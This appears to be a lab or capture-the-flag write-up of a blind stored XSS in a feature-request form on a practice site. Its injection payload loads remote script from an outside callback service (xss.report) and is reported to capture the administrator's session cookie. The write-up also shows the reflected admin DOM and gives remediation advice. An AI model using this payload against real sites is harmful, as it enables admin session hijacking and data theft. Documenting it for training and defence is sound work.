Lab name : Blind XSS - FeatureBoard - Shape what get built
# Title
Blind Cross-Site Scripting (XSS) via Feature Request Submission Leading to Admin Session

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public feature request submission form. The application fails to properly sanitize or encode user-supplied input before storing it in the database. When an administrator logs into the backend dashboard and views the "Feedback inbox" (`/admin/index.php`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://featureboard.pwnedbox.site/#submit` (Injection Point)
- `https://featureboard.pwnedbox.site/admin/index.php` (Execution Point)

# Vulnerable Parameter
Based on the DOM analysis, the following parameters are vulnerable and reflect the payload unsanitized in the admin dashboard table:
- `Feature title` (Reflected in the "Request" column)
- `Your name` (Reflected in the "Submitter" column)

# Steps to Reproduce
1. Navigate to the feature request submission form: `https://featureboard.pwnedbox.site/#submit`
2. In the **"Feature title"** and **"Your name"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields (What would you like to see?, Category, Email) with valid data and click **"Publish request"**.
4. Wait for the administrator to log in and view the submitted request in the admin dashboard.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/index.php`), and the Referrer (`/admin/index.php?status=planned`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept


# Extracted DOM
```js
<!-- PASTE YOUR DOM HERE -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin dashboard</title>
</head>
<body class="adminbody">
    <!-- ... header and sidebar ... -->
    <main class="main">
        <!-- ... metrics and toolbar ... -->
        <div class="tablewrap">
            <table class="table">
                <thead>
                    <tr><th>Request</th><th>Submitter</th><th>Votes</th><th>Status</th><th>Updated</th></tr>
                </thead>
                <tbody>
                    <tr>
                        <td>
                            <a href="view.php?id=4">
                                <!-- REFLECTION 1: Feature title -->
                                <b>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></b>
                            </a>
                            <br><span style="color:var(--muted)">Mobile</span>
                        </td>
                        <td>
                            <!-- REFLECTION 2: Your name -->
                            '"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')">
                            <br><span style="color:var(--muted)">hello@gmail.com</span>
                        </td>
                        <td>0</td>
                        <td><span class="status under_review">Under Review</span></td>
                        <td>Oct 22, 2026</td>
                    </tr>
                    <!-- ... other rows ... -->
                </tbody>
            </table>
        </div>
    </main>
    <!-- ... scripts ... -->
</body>
</html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
<img width="1920" height="1041" alt="1" src="https://github.com/user-attachments/assets/89f7eaf9-47f0-4ee2-896f-8dc0147c26ed" />
